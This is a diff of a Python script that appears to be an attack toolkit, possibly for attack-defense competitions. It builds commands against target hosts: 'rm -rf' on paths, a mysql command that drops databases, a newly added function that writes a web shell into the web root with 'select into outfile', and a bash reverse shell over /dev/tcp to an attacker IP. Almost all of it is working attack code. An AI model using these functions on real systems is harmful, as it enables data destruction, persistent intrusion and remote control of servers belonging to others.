@@ -202,13 +202,21 @@ def rm_file(target,target_port,cmd):
     return "/bin/rm " + " -rf %s"%rm_paths
 
 def rm_db(target,target_port,cmd):
-    cmd = "/usr/bin/mysql -h localhost -u%s -p%s -e '"%(db_user,db_passwd)
+    cmd = "/usr/bin/mysql -h localhost -u%s %s -e '"%(db_user,my_db_passwd)
     for db in db_name:
 	cmd += "drop database %s;"%db
     cmd += "'"
-    print cmd
+    debug_print(cmd)
     return cmd	
 	
+def mysql_get_shell(target,target_port,cmd):
+    # We use the normal shell, which can not be deleted by the defalut user
+    shell_name,shell,encode_shell = generate_shell(target,target_port,cmd,shell_type=1)
+    # To modify the quote in the shell
+    shell = shell.replace('"','\\"')
+    cmd = "/usr/bin/mysql -h localhost -u%s %s -e 'select \"%s\" into outfile \"%s/%s\"' "%(db_user,my_db_passwd,shell,shell_absolute_path,shell_name)
+    debug_print(cmd)
+    return cmd
 
 def reverse_shell(target,target_port,cmd):
     cmd = '/bin/bash -i >& /dev/tcp/%s/%d 0>&1'%(reverse_ip , reverse_port)
